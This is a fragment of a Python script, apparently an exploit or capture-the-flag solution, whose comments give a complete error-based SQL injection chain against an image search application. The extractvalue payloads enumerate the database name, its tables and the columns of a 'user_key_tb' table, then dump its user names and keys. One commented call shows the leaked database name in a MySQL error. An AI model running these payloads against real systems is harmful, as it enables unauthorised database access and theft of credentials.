...
if __name__ == '__main__':
    ...
    # SELECT * FROM image_info WHERE image_name like '%l' and extractvalue(1,concat(0x7e,database(),0x7e)) -- %'
    # SELECT * FROM image_info WHERE image_name like '%l' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) -- %'
    # SELECT * FROM image_info WHERE image_name like '%l' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='user_key_tb'),0x7e)) -- %'
    # SELECT * FROM image_info WHERE image_name like '%l' and extractvalue(1,concat(0x7e,(select group_concat(user_name) from user_key_tb),0x7e)) -- %'
    # SELECT * FROM image_info WHERE image_name like '%l' and extractvalue(1,concat(0x7e,(select group_concat(user_key) from user_key_tb),0x7e)) -- %'

    # r = get_img("l' and extractvalue(1,concat(0x7e,database(),0x7e)) -- ")
    # (1105, "XPATH syntax error: '~image_search_db~'")
    # r = get_img("l' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) -- ")
    # print(r)
    # search()
